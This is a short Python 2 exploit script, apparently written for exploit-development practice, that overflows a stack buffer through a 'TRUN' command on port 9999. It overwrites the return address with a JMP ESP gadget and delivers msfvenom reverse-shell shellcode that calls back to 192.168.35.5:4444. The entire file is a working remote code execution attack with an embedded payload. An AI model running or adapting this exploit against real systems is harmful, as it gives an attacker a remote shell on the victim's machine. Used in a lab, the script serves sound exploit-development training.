#!/usr/bin/python

import socket
import os
import sys

#77A7AE4F   FFE4             JMP ESP
ret = "\x4F\xAE\xA7\x77"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.35.5 LPORT=4444 -f python -b "\x00"
# 351 bytes
buf =  b""
buf += b"\xbb\xaf\xe1\x0d\x91\xdd\xc1\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x6d\xe5\xef"
buf += b"\x64\x8d\x0e\x6d\x86\x6d\xcf\x12\x0e\x88\xfe\x12\x74"
buf += b"\xd9\x51\xa3\xfe\x8f\x5d\x48\x52\x3b\xd5\x3c\x7b\x4c"
buf += b"\x5e\x8a\x5d\x63\x5f\xa7\x9e\xe2\xe3\xba\xf2\xc4\xda"
buf += b"\x74\x07\x05\x1a\x68\xea\x57\xf3\xe6\x59\x47\x70\xb2"
buf += b"\x61\xec\xca\x52\xe2\x11\x9a\x55\xc3\x84\x90\x0f\xc3"
buf += b"\x27\x74\x24\x4a\x3f\x99\x01\x04\xb4\x69\xfd\x97\x1c"
buf += b"\xa0\xfe\x34\x61\x0c\x0d\x44\xa6\xab\xee\x33\xde\xcf"
buf += b"\x93\x43\x25\xad\x4f\xc1\xbd\x15\x1b\x71\x19\xa7\xc8"
buf += b"\xe4\xea\xab\xa5\x63\xb4\xaf\x38\xa7\xcf\xd4\xb1\x46"
buf += b"\x1f\x5d\x81\x6c\xbb\x05\x51\x0c\x9a\xe3\x34\x31\xfc"
buf += b"\x4b\xe8\x97\x77\x61\xfd\xa5\xda\xee\x32\x84\xe4\xee"
buf += b"\x5c\x9f\x97\xdc\xc3\x0b\x3f\x6d\x8b\x95\xb8\x92\xa6"
buf += b"\x62\x56\x6d\x49\x93\x7f\xaa\x1d\xc3\x17\x1b\x1e\x88"
buf += b"\xe7\xa4\xcb\x1f\xb7\x0a\xa4\xdf\x67\xeb\x14\x88\x6d"
buf += b"\xe4\x4b\xa8\x8e\x2e\xe4\x43\x75\xb9\xcb\x3c\x56\x3c"
buf += b"\xa4\x3e\x98\x2f\x68\xb6\x7e\x25\x80\x9e\x29\xd2\x39"
buf += b"\xbb\xa1\x43\xc5\x11\xcc\x44\x4d\x96\x31\x0a\xa6\xd3"
buf += b"\x21\xfb\x46\xae\x1b\xaa\x59\x04\x33\x30\xcb\xc3\xc3"
buf += b"\x3f\xf0\x5b\x94\x68\xc6\x95\x70\x85\x71\x0c\x66\x54"
buf += b"\xe7\x77\x22\x83\xd4\x76\xab\x46\x60\x5d\xbb\x9e\x69"
buf += b"\xd9\xef\x4e\x3c\xb7\x59\x29\x96\x79\x33\xe3\x45\xd0"
buf += b"\xd3\x72\xa6\xe3\xa5\x7a\xe3\x95\x49\xca\x5a\xe0\x76"
buf += b"\xe3\x0a\xe4\x0f\x19\xab\x0b\xda\x99\xdb\x41\x46\x8b"
buf += b"\x73\x0c\x13\x89\x19\xaf\xce\xce\x27\x2c\xfa\xae\xd3"
buf += b"\x2c\x8f\xab\x98\xea\x7c\xc6\xb1\x9e\x82\x75\xb1\x8a"

crash = "."+"A"*2006+ret+"\x90"*10+buf

buf = "TRUN " + crash + "\r\n"

print "[*] Sending payload"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.35.6", 9999))
#expl.recv(1024) # read welcome message
expl.send(buf)
expl.close()
